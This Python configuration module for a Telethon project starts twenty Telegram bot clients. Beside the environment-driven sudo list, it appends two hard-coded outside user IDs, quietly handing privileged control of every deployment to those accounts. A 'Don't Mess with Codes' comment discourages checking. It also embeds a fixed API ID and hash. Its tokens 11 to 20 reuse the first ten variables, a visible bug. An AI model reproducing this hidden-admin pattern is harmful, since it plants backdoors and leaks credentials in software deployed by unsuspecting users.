import os
from telethon import TelegramClient
from decouple import config
from os import getenv
import logging


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)


#values
API_ID = 29908998
API_HASH = "3a0d920a6370b97671ea838d92dc559c"
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
BOT_TOKEN3 = config("BOT_TOKEN3", default=None)
BOT_TOKEN4 = config("BOT_TOKEN4", default=None)
BOT_TOKEN5 = config("BOT_TOKEN5", default=None)
BOT_TOKEN6 = config("BOT_TOKEN6", default=None)
BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
BOT_TOKEN11 = config("BOT_TOKEN", default=None)
BOT_TOKEN12 = config("BOT_TOKEN2", default=None)
BOT_TOKEN13 = config("BOT_TOKEN3", default=None)
BOT_TOKEN14 = config("BOT_TOKEN4", default=None)
BOT_TOKEN15 = config("BOT_TOKEN5", default=None)
BOT_TOKEN16 = config("BOT_TOKEN6", default=None)
BOT_TOKEN17 = config("BOT_TOKEN7", default=None)
BOT_TOKEN18 = config("BOT_TOKEN8", default=None)
BOT_TOKEN19 = config("BOT_TOKEN9", default=None)
BOT_TOKEN20 = config("BOT_TOKEN10", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
SUDO_USERS.append(6566179661)
SUDO_USERS.append(6898413162)

OWNER_ID = int(os.environ.get("OWNER_ID", None))


# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)

# Tokens
MK1 = TelegramClient('MK', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
MK2 = TelegramClient('MK2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
MK3 = TelegramClient('MK3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)
MK4 = TelegramClient('MK4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)
MK5 = TelegramClient('MK5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)
MK6 = TelegramClient('MK6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)
MK7 = TelegramClient('MK7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)
MK8 = TelegramClient('MK8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)
MK9 = TelegramClient('MK9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
MK10 = TelegramClient('MK10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
MK11 = TelegramClient('MK11', API_ID, API_HASH).start(bot_token=BOT_TOKEN11)
MK12 = TelegramClient('MK12', API_ID, API_HASH).start(bot_token=BOT_TOKEN12)
MK13 = TelegramClient('MK13', API_ID, API_HASH).start(bot_token=BOT_TOKEN13)
MK14 = TelegramClient('MK14', API_ID, API_HASH).start(bot_token=BOT_TOKEN14)
MK15 = TelegramClient('MK15', API_ID, API_HASH).start(bot_token=BOT_TOKEN15)
MK16 = TelegramClient('MK16', API_ID, API_HASH).start(bot_token=BOT_TOKEN16)
MK17 = TelegramClient('MK17', API_ID, API_HASH).start(bot_token=BOT_TOKEN17)
MK18 = TelegramClient('MK18', API_ID, API_HASH).start(bot_token=BOT_TOKEN18)
MK19 = TelegramClient('MK19', API_ID, API_HASH).start(bot_token=BOT_TOKEN19)
MK20 = TelegramClient('MK20', API_ID, API_HASH).start(bot_token=BOT_TOKEN20)
